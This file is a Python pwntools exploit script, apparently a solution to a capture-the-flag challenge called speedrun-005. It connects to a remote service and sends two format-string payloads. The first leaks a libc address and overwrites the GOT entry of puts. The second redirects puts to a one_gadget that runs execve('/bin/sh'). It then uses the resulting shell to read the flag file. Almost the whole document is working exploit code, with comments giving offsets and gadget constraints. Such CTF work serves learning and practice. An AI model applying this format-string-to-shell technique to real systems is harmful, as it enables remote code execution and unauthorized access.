#!/usr/bin/env python2
import sys
from pwn import *
# context.log_level = logging.DEBUG

from struct import pack

conn = remote(sys.argv[1], int(sys.argv[2]))
# conn = process("./speedrun-005")

# gdb.attach(conn, '''
# b *0x400701
# continue
# ''')

conn.recvuntil("What do you mean this time? ")

# First format string need to leak the address of a libc function
# Turns out that _IO_file_overflow + 259 is at 125
# And also overwrite GOT of puts with 0x40069d (beginning of function) to loop back

p =  "%125$18pggg     "
p += "%131c%18$hhn%105"
p += "c%19$hhn%58c%20$"
p += "hhn%192c%21$hhn%"
p += "22$hhn%23$hhn%24"
p += "$hhn%25$hh      "

# p += "%170c%18$hhn%67c"
# p += "%19$hhn%58c%20$h"
# p += "hn%192c%21$hhn%2"
# p += "2$hhn%23$hhn%24$"
# p += "hhn%25$hhn      "
# p =  "aaaaa%12$16xaaaa"
# p += "%106c%18$p  %67c"
# p += "%13$p  %58c%14$p"
# p += "  %192c%15$p  %1"
# p += "6$p  %17$p  %18$"
# p += "p  %19$p        "
p += p64(0x601018)
p += p64(0x601018+1)
p += p64(0x601018+2)
p += p64(0x601018+3)
p += p64(0x601018+4)
p += p64(0x601018+5)
p += p64(0x601018+6)
p += p64(0x601018+7)

open('payload', 'w').write(p)

conn.sendline(p)

result = conn.recvuntil('ggg')

# Parse out the address

# Note, now found the address of _IO_file_overflow + 259
string_address_of_bss = re.search('0x([0-9a-fA-F]+)ggg', result).group(1)
address_of_bss = int(string_address_of_bss, 16)

address_of_libc = address_of_bss - 0x8D403

address_of_one_gadget = address_of_libc + 0x10a38c 

# second format string overwrite GOT of puts with one_gadget

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# need to calculate the payload string manually
context.clear(arch = 'amd64')

format_string = fmtstr_payload(20, {0x601018: address_of_one_gadget}, numbwritten=-64)

# fix up the stupid string created by this function, as the addresses need to go to the bottom
format_string = format_string[64:]

# pad the format string so that we have a 
format_string += 'a' * (8 - (len(format_string) % 8))

p = format_string
# this is crazy, but this is ~ where $rsp + 0x70 is located, and it needs to be null for the one gadget to work
p += p64(0x0)
p += p64(0x0)
p += p64(0x601018)
p += p64(0x601018+1)
p += p64(0x601018+2)
p += p64(0x601018+3)
p += p64(0x601018+4)
p += p64(0x601018+5)
p += p64(0x601018+6)
p += p64(0x601018+7)

# Need to clear the stack for the one_gadget to work
p += '\x00' * 200

conn.recvuntil("What do you mean this time? ")

conn.send(p)

conn.recvuntil("Interesting ")

conn.sendline('cat /flag;exit')

result = conn.recvall()

print("FLAG: %s" % re.search('OOO{[^}]+}', result).group(0))
